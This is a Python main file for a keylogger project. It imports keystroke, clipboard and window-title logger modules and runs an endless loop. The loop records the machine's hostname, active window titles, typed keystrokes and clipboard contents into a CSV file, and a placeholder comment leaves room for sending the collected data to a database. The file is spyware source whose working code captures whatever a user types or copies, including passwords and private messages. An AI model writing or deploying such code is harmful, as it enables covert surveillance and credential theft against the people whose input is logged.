########################################################################################################################
#               This is the main.py for this project where the core of the project's code should be.                   #
#               Try to keep the code as modular as possible by separating it into functions and classes.               #
#                                                                                                                      #
#               - Keano (03-04-2023)                                                                                   #
########################################################################################################################

# Library imports here
import window_info_logger as wilogger
import keystrokes_and_clipboard_logger as kclogger
import os
import socket
from datetime import datetime, timedelta
import csv


def check_if_time_passed(old_time, time_passed):
    current_time = datetime.now()
    time_delta = current_time - old_time
    if time_delta >= timedelta(seconds=time_passed):
        return True


def initialise_log_file(csv_file):
    device_name = socket.gethostname()
    csv_file.writerow([f"Device name: {device_name}"])
    csv_file.writerow([f"Date & time: {datetime.now()}"])
    csv_file.writerow(["======================================================"])

    # Vaststellen kolommen
    # vóór versturen naar DB moet device_nam
    csv_file.writerow(["datetime", "window_title", "data_ID", "logged_data"])


# Main code here
def main():
    if os.path.isfile("logged_data.csv"):
        # Add code for sending data to database here.
        os.remove("logged_data.csv")
    old_date_and_time = datetime.now()
    note_interval_seconds = 60

    with open('logged_data.csv', 'a+', newline='') as f:
        csvreader = csv.writer(f)
        initialise_log_file(csvreader)  # Note user info and starting date + time of keylogger.
        kc_logger_object = kclogger.KeysClipboardLogger(csvreader)  # Start keylogger.
        window_logger_object = wilogger.WindowLogger(csvreader)  # Start window logger.
        while True:
            # if window change or time has passed
            if window_logger_object.screen_changed() or check_if_time_passed(old_date_and_time, note_interval_seconds):
                logged_data = kc_logger_object.get_current_logged_keys()
                window_title = window_logger_object.log_window()
                data_id = 0
                # save currently logged data to csv with old time + old app & window data + data ID = 0
                csvreader.writerow(
                    [f"{old_date_and_time}", f"{window_title}", f"{data_id}", f"{logged_data}"])
                old_date_and_time = datetime.now()  # Yes, this is only supposed to happen if window changed or minute passed.

            # if clipboard changed
            if kc_logger_object.clipboard_changed():
                clipboard_date_and_time, logged_data = kc_logger_object.log_clipboard()
                window_title = window_logger_object.log_window()
                data_id = 1
                csvreader.writerow(
                    [f"{clipboard_date_and_time}", f"{window_title}", f"{data_id}", f"{logged_data}"])


if __name__ == '__main__':
    main()
